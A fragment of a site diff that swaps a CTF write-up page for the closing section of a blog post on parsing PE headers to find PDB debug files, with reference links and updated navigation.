+    </h2>
+</doc-anchor-target>
+<p>While this will work for most files, it wont be able to handle a PE32 or if the pdb is the old PDB2.0 format. I&#x27;ll fix these issues if they ever come up while using the tool. With the end goal of using this as a BOF i didnt really see any need to update the code to have the ability to download the pdb file. (tbh i havent fleshed out the full project yet lol).</p>
+<p>Next post I&#x27;ll look at what a pdb file is and how do i parse one on linux.</p>
+<doc-anchor-target id="references">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#references">#</doc-anchor-trigger>
+        <span>References</span>
+    </h2>
+</doc-anchor-target>
+<p><a href="https://stackoverflow.com/questions/3899573/what-is-a-pdb-file">https://stackoverflow.com/questions/3899573/what-is-a-pdb-file</a>
+<a href="https://www.debuginfo.com/articles/debuginfomatch.html">https://www.debuginfo.com/articles/debuginfomatch.html</a>
+<a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#debug-type">https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#debug-type</a>
+<a href="https://stackoverflow.com/questions/3092609/how-to-get-field-names-and-offsets-of-a-struct-using-dbghlp-and-pdb">https://stackoverflow.com/questions/3092609/how-to-get-field-names-and-offsets-of-a-struct-using-dbghlp-and-pdb</a></p>
 
                                 
                                 <!-- Required only on API pages -->
@@ -412,20 +454,20 @@ LDAP        10.10.146.181   389    DC01             [+] reflection.vl\dom_rgarne
                             
                                 <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/vulnlab/rainbow/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../research/linux_kerb_tickets/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-base-text-muted">Previous</span>
-                                                <span class="block mt-1">Rainbow</span>
+                                                <span class="block mt-1">Making Linux Kerberos Tickets Not Bad</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/vulnlab/tengu/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../windows-binary-exploitation/sync-breeze-enterprise-v10.4.18/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
-                                                <span class="block mt-1">Tengu</span>
+                                                <span class="block mt-1">Sync Breeze Enterprise v​10.​4.​18</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -469,6 +511,6 @@ LDAP        10.10.146.181   389    DC01             [+] reflection.vl\dom_rgarne
 
     <div id="retype-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Reflection", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Parsing PE Headers", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
